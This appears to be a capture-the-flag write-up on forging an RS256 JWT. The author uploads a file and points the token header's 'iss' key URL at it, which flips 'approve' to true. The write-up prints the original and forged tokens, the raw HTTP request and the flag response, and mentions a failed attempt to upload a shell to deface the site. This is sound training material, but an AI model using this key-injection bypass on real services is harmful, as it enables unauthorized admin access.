## JWT Token

Address: http://172.104.49.143:1574/

Sign in with username `admin`

<p align="center">
<img src = "https://user-images.githubusercontent.com/93431512/193450231-a8541ebb-04b1-4385-9f3c-940cc067e9cb.png" width="50%" align="center">
</p>

And also upload file...

<p align="center">
<img src = "https://user-images.githubusercontent.com/93431512/193450277-04df90a0-2892-4796-8519-bf050d271189.png" width="50%">
</p>

Go back to `/` there are some uploaded files that the directories of which have form `website/uploads/<username>/<filename>`

<p align="center">
<img src = "https://user-images.githubusercontent.com/93431512/193450313-52fc3f5b-ae2e-4e0d-8152-85de4d99a103.png" width="50%">
</p>

So.. maybe up shell and mark `hacked by tronghieu220403` but it does not work 

Let's check `Proxy history` and see `getflag.js`

<p align="center">
<img src = "https://user-images.githubusercontent.com/93431512/193450418-6423eabe-25d7-4946-a5ad-feedd95d045b.png" width="50%">
</p>

This Javascript code:
```Javascript
function getFiles(){
    var xhr = new XMLHttpRequest();
    xhr.open("GET", "getflag", true);
    xhr.onload = function() {
        if (xhr.status === 200) {
            var flag = xhr.responseText.split("\n");
            var html = "";
            if (flag.length > 0) {
                    html += "<li>" + flag + "</li>";
                }
            document.getElementById("flag").innerHTML = html;
        } else {
            alert("Error: " + xhr.status);
        }
    }
    xhr.send();
}
```

Checking `./getflag`

<p align="center">
<img src = "https://user-images.githubusercontent.com/93431512/193450478-3f939786-770a-4554-a11e-badb6f104b1b.png" width="50%">
</p>

Get cookie on request
```http
Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImlzcyI6Imh0dHA6Ly9sb2NhbGhvc3Q6NTAwMC9zdGF0aWMva2V5cy5wdWIifQ.eyJ1c2VybmFtZSI6ImFkbWluIiwiYXBwcm92ZSI6ZmFsc2V9.KnO6VyVQ12jQ1uSJ8DmbxHDjMWi1-qkwx_EoVGmcpVJaP8E5g_YSl5t30Ij6cQQVFlfjMjJB0OFWm3rJtGcxvzcqgHRBZcPEPnoSPVgtq7GEa9VtsyjRYSMl7oUeiOJrnC0PifPt8KeAZRO43ZNnARULOxGH2Ntmqx6I7is4nPY1rkuz09_FxNMgiZ07gx8CBkKs7F8tNTqsIIWgEXVNFxB9QNlUokoxLjbr85muEz48-rpzqL74sKYA_pvhiwh7IoCRVg5WWrXUTEUIiA-tpX6q-CaImSSUtYL7CEw17O22hEggLwNrXBsJ17ApyaYkbU99ucB9HfMFqwdCBxudUBMagJihGLQe2w3wj_HJiYliIjdAk88l270Yjtm42OoeVW6Pf2XSR-d3ygjvNjjyxv2mBt6_443vx9nPTZ8TjA28mxGvRTs1nRHHmvDDpOLGT5WW6yApvRGoulFEsvrQdmKxPW3udGAy-xfVOjkWe_b7OaY2O4sFLKklR23Dz37H
```

Decode this Token by using [JWT Tool](https://token.dev)

<p align="center">
<img src = "https://user-images.githubusercontent.com/93431512/193450654-e6e9ca57-a3fe-43f1-9dd9-101e5893d829.png" width="100%">
</p>

We hope to change value of `approve` to `True`, but simultaneously it must be verified with RS256 

**Exploit:** We can tamper the Public key by changing `iss` value

<p align="center">
<img src = "https://user-images.githubusercontent.com/93431512/193451020-685bb621-4436-49d6-aab1-322c18dc6db5.png" width="100%">
</p>

Now we have new token

```http
GET /getflag HTTP/1.1
Host: 172.104.49.143:1574
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImlzcyI6Imh0dHA6Ly9sb2NhbGhvc3Q6NTAwMC91cGxvYWRzL2FkbWluL2hpaGkudHh0In0.eyJ1c2VybmFtZSI6ImFkbWluIiwiYXBwcm92ZSI6dHJ1ZX0.2y8teT0Yu5YlRuencanFDXbmvDkdbfgZVbtsfzCRlcBZSPtMNN0Y8dmR5yumoYPrR5SJbyDE454Sewai_nW_q7FYm0a-hrW4GdxcWvnFYNkNq-58_1NJ6XKjGUZiT89lNpMKevvYvbcEiO1fspg_10Pu9_T7PBsRw2KeXC_Vl1TuNSL5xKzdFiLxRdKdOr33QkoWqe0k4S_rp6jcbXlz2AMITcDDT5E8nWzvkPSycSke6klJGyN2Mf1H7CPzTN96d90m3fhbzKkf5a82jPo4R1IGth2b0fFLTMhCRHmhmX5k3gRswWkwZvLxiRmGy6Svtras6ldRWDMzIrhADujY1Q
Connection: close
```

```http
HTTP/1.1 200 OK
Server: Werkzeug/2.2.2 Python/3.10.5
Date: Sun, 02 Oct 2022 11:12:31 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 44
Connection: close

FLAG: Flag{JWT_token_is_the_best_token_ever}
```
